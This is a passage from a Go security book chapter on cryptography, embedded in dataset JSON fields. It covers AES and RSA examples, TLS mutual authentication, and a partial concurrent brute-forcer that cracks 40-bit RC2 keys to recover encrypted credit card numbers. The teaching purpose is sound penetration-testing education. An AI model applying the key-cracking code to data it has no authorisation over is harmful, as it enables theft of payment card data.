unpad(plaintext) ❾\nreturn plaintext, nil\n}\nListing 11-4: AES padding and decryption (/ch-11/aes/main.go)\nThe code defines two functions: unpad() and decrypt(). The\nunpad() function ❶ is a utility function scraped together to\nhandle the removal of padding data after decryption. This is a\nnecessary step, but beyond the scope of this discussion. Do\nsome research on Public Key Cryptography Standards (PKCS)\n#7 padding for more information. It’s a relevant topic for AES,\nas it’s used to ensure that our data has proper block alignment.\nFor this example, just know that you’ll need the function later\nto clean up your data. The function itself assumes some facts\nthat you’d want to explicitly validate in a real-world scenario.\nSpecifically, you’d want to confirm that the value of the\npadding bytes is valid, that the slice offsets are valid, and that\nthe result is of appropriate length.\nThe most interesting logic exists within the decrypt() function\n❷, which takes two byte slices: the ciphertext you need to\ndecrypt and the symmetric key you’ll use to do it. The\nfunction performs some validation to confirm that the\nciphertext is at least as long as your block size ❸. This is a\nnecessary step, because CBC mode encryption uses an\ninitialization vector (IV) for randomness. This IV, like a salt\nvalue for password hashing, doesn’t need to remain secret. The\nIV, which is the same length as a single AES block, is\nprepended onto your ciphertext during encryption. If the\nciphertext length is less than the expected block size, you\nknow that you either have an issue with the cipher text or are\nmissing the IV. You also check whether the ciphertext length\nis a multiple of the AES block size ❹. If it’s not, decryption\nwill fail spectacularly, because CBC mode expects the\nciphertext length to be a multiple of the block size.\nOnce you’ve completed your validation checks, you can\nproceed to decrypt the ciphertext. As mentioned previously,\nthe IV is prepended to the ciphertext, so the first thing you do\nis extract the IV from the ciphertext ❺. You use the\naes.BlockSize constant to retrieve the IV and then redefine your\nciphertext variable to the remainder of your ciphertext via\nciphertext = [aes.BlockSize:]. You now have your encrypted data\nseparate from your IV.\nNext, you call aes.NewCipher(), passing it your symmetric-key\nvalue ❻. This initializes your AES block mode cipher,\nassigning it to a variable named block. You then instruct your\nAES cipher to operate in CBC mode by calling\ncipher.NewCBCDecryptor(block, iv) ❼. You assign the result to a\nvariable named mode. (The crypto/cipher package contains\nadditional initialization functions for other AES modes, but\nyou’re using only CBC decryption here.) You then issue a call\nto mode.CryptBlocks(plaintext, ciphertext) to decrypt the contents of\nciphertext ❽ and store the result in the plaintext byte slice. Lastly,\nyou ❾ remove your PKCS #7 padding by calling your unpad()\nutility function. You return the result. If all went well, this\nshould be the plaintext value of the credit card number.\nA sample run of the program produces the expected result:\n$ go run main.go\nkey =\naca2d6b47cb5c04beafc3e483b296b20d07c32db16029a52808fde98786646c8\nciphertext =\n7ff4a8272d6b60f1e7cfc5d8f5bcd047395e31e5fc83d062716082010f637c8f21150eabace62\n--snip--\nplaintext = 4321123456789090\nNotice that you didn’t define a main() function in this sample\ncode. Why not? Well, decrypting data in unfamiliar\nenvironments has a variety of potential nuances and variations.\nAre the ciphertext and key values encoded or raw binary? If\nthey’re encoded, are they a hex string or Base64? Is the data\nlocally accessible, or do you need to extract it from a data\nsource or interact with a hardware security module, for\nexample? The point is, decryption is rarely a copy-and-paste\nendeavor and often requires some level of understanding of\nalgorithms, modes, database interaction, and data encoding.\nFor this reason, we’ve chosen to lead you to the answer with\nthe expectation that you’ll inevitably have to figure it out\nwhen the time is right.\nKnowing just a little bit about symmetric-key encryption\ncan make your penetrations tests much more successful. For\nexample, in our experience pilfering client source-code\nrepositories, we’ve found that people often use the AES\nencryption algorithm, either in CBC or Electronic Codebook\n(ECB) mode. ECB mode has some inherent weaknesses and\nCBC isn’t any better, if implemented incorrectly. Crypto can\nbe hard to understand, so often developers assume that all\ncrypto ciphers and modes are equally effective and are\nignorant of their subtleties. Although we don’t consider\nourselves cryptographers, we know just enough to implement\ncrypto securely in Go—and to exploit other people’s deficient\nimplementations.\nAlthough symmetric-key encryption is faster than\nasymmetric cryptography, it suffers from inherent key-\nmanagement challenges. After all, to use it, you must\ndistribute the same key to any and all systems or applications\nthat perform the encryption or decryption functions on the\ndata. You must distribute the key securely, often following\nstrict processes and auditing requirements. Also, relying solely\non symmetric-key cryptography prevents arbitrary clients\nfrom, for example, establishing encrypted communications\nwith other nodes. There isn’t a good way to negotiate the\nsecret key, nor are there authentication or integrity assurances\nfor many common algorithms and modes.1 That means\nanyone, whether authorized or malicious, who obtains the\nsecret key can proceed to use it.\nThis is where asymmetric cryptography can be of use.\nAsymmetric Cryptography\nMany of the problems associated with symmetric-key\nencryption are solved by asymmetric (or public-key)\ncryptography, which uses two separate but mathematically\nrelated keys. One is available to the public and the other is\nkept private. Data encrypted by the private key can be\ndecrypted only by the public key, and data encrypted by the\npublic key can be decrypted only by the private key. If the\nprivate key is protected properly and kept, well, private, then\ndata encrypted with the public key remains confidential, since\nyou need the closely guarded private key to decrypt it. Not\nonly that, but you could use the private key to authenticate a\nuser. The user could use the private key to sign messages, for\nexample, which the public could decrypt using the public key.\nSo, you might be asking, “What’s the catch? If public-key\ncryptography provides all these assurances, why do we even\nhave symmetric-key cryptography?” Good question, you! The\nproblem with public-key encryption is its speed; it’s a lot\nslower than its symmetric counterpart. To get the best of both\nworlds (and avoid the worst), you’ll often find organizations\nusing a hybrid approach: they’ll use asymmetric crypto for the\ninitial communications negotiation, establishing an encrypted\nchannel through which they create and exchange a symmetric\nkey (often called a session key). Because the session key is\nfairly small, using public-key crypto for this process requires\nlittle overhead. Both the client and server then have a copy of\nthe session key, which they use to make future\ncommunications faster.\nLet’s look at a couple of common use cases for public-key\ncrypto. Specifically, we’ll look at encryption, signature\nvalidation, and mutual authentication.\nEncryption and Signature Validation\nFor this first example, you’ll use public-key crypto to encrypt\nand decrypt a message. You’ll also create the logic to sign a\nmessage and validate that signature. For simplicity, you’ll\ninclude all of this logic in a single main() function. This is\nmeant to show you the core functionality and logic so that you\ncan implement it. In a real-world scenario, the process is a\nlittle more complex, since you’re likely to have two remote\nnodes communicating with each other. These nodes would\nhave to exchange public keys. Fortunately, this exchange\nprocess doesn’t require the same security assurances as\nexchanging symmetric keys. Recall that any data encrypted\nwith the public key can be decrypted only by the related\nprivate key. So, even if you perform a man-in-the-middle\nattack to intercept the public-key exchange and future\ncommunications, you won’t be able to decrypt any of the data\nencrypted by the same public key. Only the private key can\ndecrypt it.\nLet’s take a look at the implementation shown in Listing\n11-5. We’ll elaborate on the logic and cryptographic\nfunctionality as we review the example.\nfunc main() {\nvar (\nerr error\nprivateKey *rsa.PrivateKey\npublicKey *rsa.PublicKey\nmessage, plaintext, ciphertext, signature, label []byte\n)\nif privateKey, err = rsa.GenerateKey(rand.Reader, 2048)❶; err != nil {\nlog.Fatalln(err)\n}\npublicKey = &privateKey.PublicKey ❷\nlabel = []byte(\"\")\nmessage = []byte(\"Some super secret message, maybe a session key even\")\nciphertext, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey,\nmessage, label) ❸\nif err != nil {\nlog.Fatalln(err)\n}\nfmt.Printf(\"Ciphertext: %x\\n\", ciphertext)\nplaintext, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey,\nciphertext, label) ❹\nif err != nil {\nlog.Fatalln(err)\n}\nfmt.Printf(\"Plaintext: %s\\n\", plaintext)\nh := sha256.New()\nh.Write(message)\nsignature, err = rsa.SignPSS(rand.Reader, privateKey, crypto.SHA256,\nh.Sum(nil), nil) ❺\nif err != nil {\nlog.Fatalln(err)\n}\nfmt.Printf(\"Signature: %x\\n\", signature)\nerr = rsa.VerifyPSS(publicKey, crypto.SHA256, h.Sum(nil), signature, nil)❻\nif err != nil {\nlog.Fatalln(err)\n}\nfmt.Println(\"Signature verified\")\n}\nListing 11-5: Asymmetric, or public-key, encryption (/ch-11/public-key/main.go/)\nThe program demonstrates two separate but related public-\nkey crypto functions: encryption/decryption and message\nsigning. You first generate a public/private key pair by calling\nthe rsa.GenerateKey() function ❶. You supply a random reader\nand a key length as input parameters to the function. Assuming\nthe random reader and key lengths are adequate to generate a\nkey, the result is an *rsa.PrivateKey instance that contains a field\nwhose value is the public key. You now have a working key\npair. You assign the public key to its own variable for the sake\nof convenience ❷.\nThis program generates this key pair every time it’s run. In\nmost circumstances, such as SSH communications, you’ll\ngenerate the key pair a single time, and then save and store the\nkeys to disk. The private key will be kept secure, and the\npublic key will be distributed to endpoints. We’re skipping\nkey distribution, protection, and management here, and\nfocusing only on the cryptographic functions.\nNow that you’ve created the keys, you can start using them\nfor encryption. You do so by calling the function\nrsa.EncryptOAEP() ❸, which accepts a hashing function, a reader\nto use for padding and randomness, your public key, the\nmessage you wish to encrypt, and an optional label. This\nfunction returns an error (if the inputs cause the algorithm to\nfail) and our ciphertext. You can then pass the same hashing\nfunction, a reader, your private key, your ciphertext, and a\nlabel into the function rsa.DecryptOAEP() ❹. The function\ndecrypts the ciphertext by using your private key and returns\nthe cleartext result.\nNotice that you’re encrypting the message with the public\nkey. This ensures that only the holder of the private key will\nhave the ability to decrypt the data. Next you create a digital\nsignature by calling rsa.SignPSS() ❺. You pass to it, again, a\nrandom reader, your private key, the hashing function you’re\nusing, the hash value of the message, and a nil value\nrepresenting additional options. The function returns any\nerrors and the resulting signature value. Much like human\nDNA or fingerprints, this signature uniquely identifies the\nidentity of the signer (that is, the private key). Anybody\nholding the public key can validate the signature to not only\ndetermine the authenticity of the signature but also validate the\nintegrity of the message. To validate the signature, you pass\nthe public key, hash function, hash value, signature, and\nadditional options to rsa.VerifyPSS() ❻. Notice that in this case\nyou’re passing the public key, not the private key, into this\nfunction. Endpoints wishing to validate the signature won’t\nhave access to the private key, nor will validation succeed if\nyou input the wrong key value. The rsa.VerifyPSS() function\nreturns nil when the signature is valid and an error when it’s\ninvalid.\nHere is a sample run of the program. It behaves as\nexpected, encrypting the message by using a public key,\ndecrypting it by using a private key, and validating the\nsignature:\n$ go run main.go\nCiphertext: a9da77a0610bc2e5329bc324361b480ba042e09ef58e4d8eb106c8fc0b5\n--snip--\nPlaintext: Some super secret message, maybe a session key even\nSignature: 68941bf95bbc12edc12be369f3fd0463497a1220d9a6ab741cf9223c6793\n--snip--\nSignature verified\nNext up, let’s look at another application of public-key\ncryptography: mutual authentication.\nMutual Authentication\nMutual authentication is the process by which a client and\nserver authenticate each other. They do this with public-key\ncryptography; both the client and server generate\npublic/private key pairs, exchange public keys, and use the\npublic keys to validate the authenticity and identity of the\nother endpoint. To accomplish this feat, both the client and\nserver must do some legwork to set up the authorization,\nexplicitly defining the public key value with which they intend\nto validate the other. The downside to this process is the\nadministrative overhead of having to create unique key pairs\nfor every single node and ensuring that the server and the\nclient nodes have the appropriate data to proceed properly.\nTo begin, you’ll knock out the administrative tasks of\ncreating key pairs. You’ll store the public keys as self-signed,\nPEM-encoded certificates. Let’s use the openssl utility to create\nthese files. On your server, you’ll create the server’s private\nkey and certificate by entering the following:\n$ openssl req -nodes -x509 -newkey rsa:4096 -keyout serverKey.pem -out\nserverCrt.pem -days 365\nHivaNetwork.Com\nThe openssl command will prompt you for various inputs, to\nwhich you can supply arbitrary values for this example. The\ncommand creates two files: serverKey.pem and serverCrt.pem.\nThe file serverKey.pem contains your private key, and you\nshould protect it. The serverCrt.pem file contains the server’s\npublic key, which you’ll distribute to each of your connecting\nclients.\nFor every connecting client, you’ll run a command similar\nto the preceding one:\n$ openssl req -nodes -x509 -newkey rsa:4096 -keyout clientKey.pem -out\nclientCrt.pem -days 365\nThis command also generates two files: clientKey.pem and\nclientCrt.pem. Much as with the server output, you should\nprotect the client’s private key. The clientCrt.pem certificate\nfile will be transferred to your server and loaded by your\nprogram. This will allow you to configure and identify the\nclient as an authorized endpoint. You’ll have to create,\ntransfer, and configure a certificate for each additional client\nso that the server can identify and explicitly authorize them.\nIn Listing 11-6, you set up an HTTPS server that requires a\nclient to provide a legitimate, authorized certificate.\nfunc helloHandler(w http.ResponseWriter, r *http.Request) { ❶\nfmt.Printf(\"Hello: %s\\n\", r.TLS.PeerCertificates[0].Subject.CommonName) ❷\nfmt.Fprint(w, \"Authentication successful\")\n}\nfunc main() {\nvar (\nerr error\nclientCert []byte\npool *x509.CertPool\ntlsConf *tls.Config\nserver *http.Server\n)\nhttp.HandleFunc(\"/hello\", helloHandler)\nif clientCert, err = ioutil.ReadFile(\"../client/clientCrt.pem\")❸; err != nil {\nlog.Fatalln(err)\n}\npool = x509.NewCertPool()\npool.AppendCertsFromPEM(clientCert) ❹\ntlsConf = &tls.Config{ ❺\nClientCAs: pool,\nClientAuth: tls.RequireAndVerifyClientCert,\n}\ntlsConf.BuildNameToCertificate() ❻\nserver = &http.Server{\nAddr: \":9443\",\nTLSConfig: tlsConf, ❼\n}\nlog.Fatalln(server.ListenAndServeTLS(\"serverCrt.pem\", \"serverKey.pem\")❽)\n}\nListing 11-6: Setting up a mutual authentication server (/ch-11/mutual-\nauth/cmd/server/main.go)\nOutside the main() function, the program defines a\nhelloHandler() function ❶. As we discussed way back in Chapters\n3 and 4, the handler function accepts an http.ResponseWriter\ninstance and the http.Request itself. This handler is pretty boring.\nIt logs the common name of the client certificate received ❷.\nThe common name is accessed by inspecting the http.Request’s\nTLS field and drilling down into the certificate PeerCertificates\ndata. The handler function also sends the client a message\nindicating that authentication was successful.\nBut how do you define which clients are authorized, and\nhow do you authenticate them? The process is fairly painless.\nYou first read the client’s certificate from the PEM file the\nclient created previously ❸. Because it’s possible to have\nmore than one authorized client certificate, you create a\ncertificate pool and call pool.AppendCertsFromPEM(clientCert) to add\nthe client certificate to your pool ❹. You perform this step for\neach additional client you wish to authenticate.\nNext, you create your TLS configuration. You explicitly set\nthe ClientCAs field to your pool and configure ClientAuth to\ntls.RequireAndVerifyClientCert ❺. This configuration defines your\npool of authorized clients and requires clients to properly\nidentify themselves before they’ll be allowed to proceed. You\nissue a call to tlsConf.BuildNameToCertificate() so that the client’s\ncommon and subject alternate names—the domain names for\nwhich the certificate was generated—will properly map to\ntheir given certificate ❻. You define your HTTP server,\nexplicitly setting your custom configuration ❼, and start the\nserver by calling server.ListenAndServeTLS(), passing to it the server\ncertificate and private-key files you created previously ❽.\nNote that you don’t use the client’s private-key file anywhere\nin the server code. As we’ve said before, the private key\nremains private; your server will be able to identify and\nauthorize clients by using only the client’s public key. This is\nthe brilliance of public-key crypto.\nYou can validate your server by using curl. If you generate\nand supply a bogus, unauthorized client certificate and key,\nyou’ll be greeted with a verbose message telling you so:\n$ curl -ik -X GET --cert badCrt.pem --key badKey.pem \\\nhttps://server.blackhat-go.local:9443/hello\ncurl: (35) gnutls_handshake() failed: Certificate is bad\nYou’ll also get a more verbose message on the server,\nsomething like this:\nhttp: TLS handshake error from 127.0.0.1:61682: remote error: tls: unknown\ncertificate authority\nOn the flip side, if you supply the valid certificate and the\nkey that matches the certificate configured in the server pool,\nyou’ll enjoy a small moment of glory as it successfully\nauthenticates:\n$ curl -ik -X GET --cert clientCrt.pem --key clientKey.pem \\\nhttps://server.blackhat-go.local:9443/hello\nHTTP/1.1 200 OK\nDate: Fri, 09 Oct 2020 16:55:52 GMT\nContent-Length: 25\nContent-Type: text/plain; charset=utf-8\nAuthentication successful\nThis message tells you the server works as expected.\nNow, let’s have a look at a client (Listing 11-7). You can\nrun the client on either the same system as the server or a\ndifferent one. If it’s on a different system, you’ll need to\ntransfer clientCrt.pem to the server and serverCrt.pem to the\nclient.\nfunc main() {\nvar (\nerr error\ncert tls.Certificate\nserverCert, body []byte\npool *x509.CertPool\ntlsConf *tls.Config\ntransport *http.Transport\nclient *http.Client\nresp *http.Response\n)\nif cert, err = tls.LoadX509KeyPair(\"clientCrt.pem\", \"clientKey.pem\"); err != nil\n{ ❶\nlog.Fatalln(err)\n}\nif serverCert, err = ioutil.ReadFile(\"../server/serverCrt.pem\"); err != nil { ❷\nlog.Fatalln(err)\n}\npool = x509.NewCertPool()\npool.AppendCertsFromPEM(serverCert) ❸\ntlsConf = &tls.Config{ ❹\nCertificates: []tls.Certificate{cert},\nRootCAs: pool,\n}\ntlsConf.BuildNameToCertificate()❺\ntransport = &http.Transport{ ❻\nTLSClientConfig: tlsConf,\n}\nclient = &http.Client{ ❼\nTransport: transport,\n}\nif resp, err = client.Get(\"https://server.blackhat-go.local:9443/hello\"); err != nil {\n❽\nlog.Fatalln(err)\n}\nif body, err = ioutil.ReadAll(resp.Body); err != nil { ❾\nlog.Fatalln(err)\n}\ndefer resp.Body.Close()\nfmt.Printf(\"Success: %s\\n\", body)\n}\nListing 11-7: The mutual authentication client (/ch-11/mutual-\nauth/cmd/client/main.go)\nA lot of the certificate preparation and configuration will\nlook similar to what you did in the server code: creating a pool\nof certificates and preparing subject and common names.\nSince you won’t be using the client certificate and key as a\nserver, you instead call tls.LoadX509KeyPair(\"clientCrt.pem\",\n\"clientKey.pem\") to load them for use later ❶. You also read the\nserver certificate, adding it to the pool of certificates you wish\nto allow ❷. You then use the pool and client certificates ❸ to\nbuild your TLS configuration ❹, and call\ntlsConf.BuildNameToCertificate() to bind domain names to their\nrespective certificates ❺.\nSince you’re creating an HTTP client, you have to define a\ntransport ❻, correlating it with your TLS configuration. You\ncan then use the transport instance to create an http.Client struct\n❼. As we discussed in Chapters 3 and 4, you can use this\nclient to issue an HTTP GET request via\nclient.Get(\"https://server.blackhat-go.local:9443/hello\")\n❽.\nAll the magic happens behind the scenes at this point.\nMutual authentication is performed—the client and the server\nmutually authenticate each other. If authentication fails, the\nprogram returns an error and exits. Otherwise, you read the\nHTTP response body and display it to stdout ❾. Running your\nclient code produces the expected result, specifically, that\nthere were no errors thrown and that authentication succeeds:\n$ go run main.go\nSuccess: Authentication successful"
  },
  {
    "input": "Brute-Forcing RC2",
    "output": "Your server output is shown next. Recall that you\nconfigured the server to log a hello message to standard\noutput. This message contains the common name of the\nconnecting client, extracted from the certificate:\n$ go run main.go\nHello: client.blackhat-go.local\nYou now have a functional sample of mutual\nauthentication. To further enhance your understanding, we\nencourage you to tweak the previous examples so they work\nover TCP sockets.\nIn the next section, you’ll dedicate your efforts to a more\ndevious purpose: brute-forcing RC2 encryption cipher\nsymmetric keys.\nBRUTE-FORCING RC2\nRC2 is a symmetric-key block cipher created by Ron Rivest in\n1987. Prompted by recommendations from the government,\nthe designers used a 40-bit encryption key, which made the\ncipher weak enough that the US government could brute-force\nthe key and decrypt communications. It provided ample\nconfidentiality for most communications but allowed the\ngovernment to peep into chatter with foreign entities, for\nexample. Of course, back in the 1980s, brute-forcing the key\nrequired significant computing power, and only well-funded\nnation states or specialty organizations had the means to\ndecrypt it in a reasonable amount of time. Fast-forward 30\nyears; today, the common home computer can brute-force a\n40-bit key in a few days or weeks.\nSo, what the heck, let’s brute force a 40-bit key.\nGetting Started\nBefore we dive into the code, let’s set the stage. First of all,\nneither the standard nor extended Go crypto libraries have an\nRC2 package intended for public consumption. However,\nthere’s an internal Go package for it. You can’t import internal\npackages directly in external programs, so you’ll have to find\nanother way to use it.\nSecond, to keep things simple, you’ll make some\nassumptions about the data that you normally wouldn’t want to\nmake. Specifically, you’ll assume that the length of your\ncleartext data is a multiple of the RC2 block size (8 bytes) to\navoid clouding your logic with administrative tasks like\nhandling PKCS #5 padding. Handling the padding is similar to\nwhat you did with AES previously in this chapter (see Listing\n11-4), but you’d need to be more diligent in validating the\ncontents to maintain the integrity of the data you’ll be working\nwith. You’ll also assume that your ciphertext is an encrypted\ncredit card number. You’ll check the potential keys by\nvalidating the resulting plaintext data. In this case, validating\nthe data involves making sure the text is numeric and then\nsubjecting it to a Luhn check, which is a method of validating\ncredit card numbers and other sensitive data.\nNext, you’ll assume you were able to determine—perhaps\nfrom pilfering filesystem data or source code—that the data is\nencrypted using a 40-bit key in ECB mode with no\ninitialization vector. RC2 supports variable-length keys and,\nsince it’s a block cipher, can operate in different modes. In\nECB mode, which is the simplest mode, blocks of data are\nencrypted independently of other blocks. This will make your\nlogic a little more straightforward. Lastly, although you can\ncrack the key in a nonconcurrent implementation, if you so\nchoose, a concurrent implementation will be far better\nperforming. Rather than building this thing iteratively,\nshowing first a nonconcurrent version followed by a\nconcurrent one, we’ll go straight for the concurrent build.\nNow you’ll install a couple of prerequisites. First, retrieve\nthe official RC2 Go implementation from\nhttps://github.com/golang/crypto/blob/master/pkcs12/internal/\nrc2/rc2.go. You’ll need to install this in your local workspace\nso that you can import it into your brute-forcer. As we\nmentioned earlier, the package is an internal package, meaning\nthat, by default, outside packages can’t import and use it. This\nis a little hacky, but it’ll prevent you from having to use a\nthird-party implementation or—shudder—writing your own\nRC2 cipher code. If you copy it into your workspace, the non-\nexported functions and types become part of your\ndevelopment package, which makes them accessible.\nLet’s also install a package that you’ll use to perform the\nLuhn check:\n$ go get github.com/joeljunstrom/go-luhn\nA Luhn check calculates checksums on credit card numbers\nor other identification data to determine whether they’re valid.\nYou’ll use the existing package for this. It’s well-documented\nand it’ll save you from re-creating the wheel.\nNow you can write your code. You’ll need to iterate\nthrough every combination of the entire key space (40-bits),\ndecrypting your ciphertext with each key, and then validating\nyour result by making sure it both consists of only numeric\ncharacters and passes a Luhn check. You’ll use a\nproducer/consumer model to manage the work—the producer\nwill push a key to a channel and the consumers will read the\nkey from the channel and execute accordingly. The work itself\nwill be a single key value. When you find a key that produces\nproperly validated plaintext (indicating you found a credit card\nnumber), you’ll signal each of the goroutines to stop their\nwork.\nOne of the interesting challenges of this problem is how to\niterate the key space. In our solution, you iterate it using a for\nloop, traversing the key space represented as uint64 values. The\nchallenge, as you’ll see, is that uint64 occupies 64 bits of space\nin memory. So, converting from a uint64 to a 40-bit (5-byte)\n[]byte RC2 key requires that you crop off 24 bits (3 bytes) of\nunnecessary data. Hopefully, this process becomes clear once\nyou’ve looked at the code. We’ll take it slow, breaking down\nsections of the program and working through them one by one.\nListing 11-8 begins the program.\nimport (\n\"crypto/cipher\"\n\"encoding/binary\"\n\"encoding/hex\"\n\"fmt\"\n\"log\"\n\"regexp\"\n\"sync\"\n❶ luhn \"github.com/joeljunstrom/go-luhn\"\n❷ \"github.com/bhg/ch-11/rc2-brute/rc2\"\n)\nHivaNetwork.Com\n❸ var numeric = regexp.MustCompile(`^\\d{8}$`)\n❹ type CryptoData struct {\nblock cipher.Block\nkey []byte\n}\nListing 11-8: Importing the RC2 brute-force type (/ch-11/rc2-brute/main.go)\nWe’ve included the import statements here to draw attention\nto the inclusion of the third-party go-luhn package ❶, as well as\nthe inclusion of the rc2 package ❷ you cloned from the\ninternal Go repository. You also compile a regular expression\n❸ that you’ll use to check whether the resulting plaintext\nblock is 8 bytes of numeric data.\nNote that you’re checking 8 bytes of data and not 16 bytes,\nwhich is the length of your credit card number. You’re\nchecking 8 bytes because that’s the length of an RC2 block.\nYou’ll be decrypting your ciphertext block by block, so you\ncan check the first block you decrypt to see whether it’s\nnumeric. If the 8 bytes of the block aren’t all numeric, you can\nconfidently assume that you aren’t dealing with a credit card\nnumber and can skip the decryption of the second block of\nciphertext altogether. This minor performance improvement\nwill significantly reduce the time it takes to execute millions\nof times over.\nLastly, you define a type named CryptoData ❹ that you’ll use\nto store your key and a cipher.Block. You’ll use this struct to\ndefine units of work, which producers will create and\nconsumers will act upon.\nProducing Work\nLet’s look at the producer function (Listing 11-9). You place\nthis function after your type definitions in the previous code\nlisting.\n❶ func generate(start, stop uint64, out chan <- *CryptoData,\\\ndone <- chan struct{}, wg *sync.WaitGroup) {\n❷ wg.Add(1)\n❸ go func() {\n❹ defer wg.Done()\nvar (\nblock cipher.Block\nerr error\nkey []byte\ndata *CryptoData\n)\n❺ for i := start; i <= stop; i++ {\nkey = make([]byte, 8)\n❻ select {\n❼ case <- done:\nreturn\n❽ default:\n❾ binary.BigEndian.PutUint64(key, i)\nif block, err = rc2.New(key[3:], 40); err != nil {\nlog.Fatalln(err)\n}\ndata = &CryptoData{\nblock: block,\nkey: key[3:],\n}\n❿ out <- data\n}\n}\n}()\nreturn\n}\nListing 11-9: The RC2 producer function (/ch-11/rc2-brute/main.go)\nYour producer function is named generate() ❶. It accepts two\nuint64 variables used to define a segment of the key space on\nwhich the producer will create work (basically, the range over\nwhich they’ll produce keys). This allows you to break up the\nkey space, distributing portions of it to each producer.\nThe function also accepts two channels: a *CryptData write-\nonly channel used for pushing work to consumers and a\ngeneric struct channel that’ll be used for receiving signals from\nconsumers. This second channel is necessary so that, for\nexample, a consumer that identifies the correct key can\nexplicitly signal the producer to stop producing. No sense\ncreating more work if you’ve already solved the problem.\nLastly, your function accepts a WaitGroup to be used for tracking\nand synchronizing producer execution. For each concurrent\nproducer that runs, you execute wg.Add(1) ❷ to tell the WaitGroup\nthat you started a new producer.\nYou populate your work channel within a goroutine ❸,\nincluding a call to defer wg.Done() ❹ to notify your WaitGroup\nwhen the goroutine exits. This will prevent deadlocks later as\nyou try to continue execution from your main() function. You\nuse your start() and stop() values to iterate a subsection of the key\nspace by using a for loop ❺. Every iteration of the loop\nincrements the i variable until you’ve reached your ending\noffset.\nAs we mentioned previously, your key space is 40 bits, but\ni is 64 bits. This size difference is crucial to understand. You\ndon’t have a native Go type that is 40 bits. You have only 32-\nor 64-bit types. Since 32 bits is too small to hold a 40-bit\nvalue, you need to use your 64-bit type instead, and account\nfor the extra 24 bits later. Perhaps you could avoid this whole\nchallenge if you could iterate the entire key space by using a\n[]byte instead of a uint64. But doing so would likely require some\nfunky bitwise operations that may overcomplicate the\nexample. So, you’ll deal with the length nuance instead.\nWithin your loop, you include a select statement ❻ that may\nlook silly at first, because it’s operating on channel data and\ndoesn’t fit the typical syntax. You use it to check whether your\ndone channel has been closed via case <- done ❼. If the channel is\nclosed, you issue a return statement to break out of your\ngoroutine. When the done channel isn’t closed, you use the\ndefault case ❽ to create the crypto instances necessary to define\nwork. Specifically, you call binary.BigEndian.PutUint64(key, i) ❾ to\nwrite your uint64 value (the current key) to a []byte named key.\nAlthough we didn’t explicitly call it out earlier, you\ninitialized key as an 8-byte slice. So why are you defining the\nslice as 8 bytes when you’re dealing with only a 5-byte key?\nWell, since binary.BigEndian.PutUint64 takes a uint64 value, it\nrequires a destination slice of 8 bytes in length or else it\nthrows an index-out-of-range error. It can’t fit an 8-byte value\ninto a 5-byte slice. So, you give it an 8-byte slice. Notice\nthroughout the remainder of the code, you use only the last 5\nbytes of the key slice; even though the first 3 bytes will be zero,\nthey will still corrupt the austerity of our crypto functions if\nincluded. This is why you call rc2.New(key[3:], 40) to create your\ncipher initially; doing so drops the 3 irrelevant bytes and also\npasses in the length, in bits, of your key: 40. You use the\nresulting cipher.Block instance and the relevant key bytes to\ncreate a CryptoData object, and you write it to the out worker\nchannel ❿.\nThat’s it for the producer code. Notice that in this section\nyou’re only bootstrapping the relevant key data needed.\nNowhere in the function are you actually attempting to decrypt\nthe ciphertext. You’ll perform this work in your consumer\nfunction.\nPerforming Work and Decrypting Data\nLet’s review the consumer function now (Listing 11-10).\nAgain, you’ll add this function to the same file as your\nprevious code.\n❶ func decrypt(ciphertext []byte, in <- chan *CryptoData, \\\ndone chan struct{}, wg *sync.WaitGroup) {\nsize := rc2.BlockSize\nplaintext := make([]byte, len(ciphertext))\n❷ wg.Add(1)\ngo func() {\n❸ defer wg.Done()\n❹ for data := range in {\nselect {\n❺ case <- done:\nreturn\n❻ default:\n❼ data.block.Decrypt(plaintext[:size], ciphertext[:size])\n❽ if numeric.Match(plaintext[:size]) {\n❾ data.block.Decrypt(plaintext[size:], ciphertext[size:])\n❿ if luhn.Valid(string(plaintext)) && \\\nnumeric.Match(plaintext[size:]) {\nfmt.Printf(\"Card [%s] found using key [%x]\\n\", /\nplaintext, data.key)\nclose(done)\nreturn\n}\n}\n}\n}\n}()\n}\nListing 11-10: The RC2 consumer function (/ch-11/rc2-brute/main.go)\nYour consumer function, named decrypt() ❶, accepts several\nparameters. It receives the ciphertext you wish to decrypt. It\nalso accepts two separate channels: a read-only *CryptoData\nchannel named in that you’ll use as a work queue and a\nchannel named done that you’ll use for sending and receiving\nexplicit cancellation signals. Lastly, it also accepts a\n*sync.WaitGroup named wg that you’ll use for managing your\nconsumer workers, much like your producer implementation.\nYou tell your WaitGroup that you’re starting a worker by calling\nwg.Add(1) ❷. This way, you’ll be able to track and manage all\nthe consumers that are running.\nNext, inside your goroutine, you call defer wg.Done() ❸ so\nthat when the goroutine function ends, you’ll update the\nWaitGroup state, reducing the number of running workers by\none. This WaitGroup business is necessary for you to\nsynchronize the execution of your program across an arbitrary\nnumber of workers. You’ll use the WaitGroup in your main()\nfunction later to wait for your goroutines to complete.\nThe consumer uses a for loop ❹ to repeatedly read CryptoData\nwork structs from the in channel. The loop stops when the\nchannel is closed. Recall that the producer populates this\nchannel. As you’ll see shortly, this channel closes after the\nproducers have iterated their entire key space subsections and\npushed the relative crypto data onto the work channel.\nTherefore, your consumer loops until the producers are done\nproducing.\nAs you did in the producer code, you use a select statement\nwithin the for loop to check whether the done channel has been\nclosed ❺, and if it has, you explicitly signal the consumer to\nstop additional work efforts. A worker will close the channel\nwhen a valid credit card number has been identified, as we’ll\ndiscuss in a moment. Your default case ❻ performs the crypto\nheavy lifting. First, it decrypts the first block (8 bytes) of\nciphertext ❼, checking whether the resulting plaintext is an 8-\nbyte, numeric value ❽. If it is, you have a potential card\nnumber and proceed to decrypt the second block of ciphertext\n❾. You call these decryption functions by accessing the\ncipher.Block field within your CryptoData work object that you read\nin from the channel. Recall that the producer instantiated the\nstruct by using a unique key value taken from the key space.\nLastly, you validate the entirety of the plaintext against the\nLuhn algorithm and validate that the second block of plaintext\nis an 8-byte, numeric value ❿. If these checks succeed, you\ncan be reasonably sure that you found a valid credit card\nnumber. You display the card number and the key to stdout and\ncall close(done) to signal the other goroutines that you’ve found\nwhat you’re after.\nWriting the Main Function\nBy this point, you have your producer and consumer functions,\nboth equipped to execute with concurrency. Now, let’s tie it all\ntogether in your main() function (Listing 11-11), which will\nappear in the same source file as the previous listings.\nfunc main() {\nvar (\nerr error\nciphertext []byte\n)\nif ciphertext, err = hex.DecodeString(\"0986f2cc1ebdc5c2e25d04a136fa1a6b\");\nerr != nil { 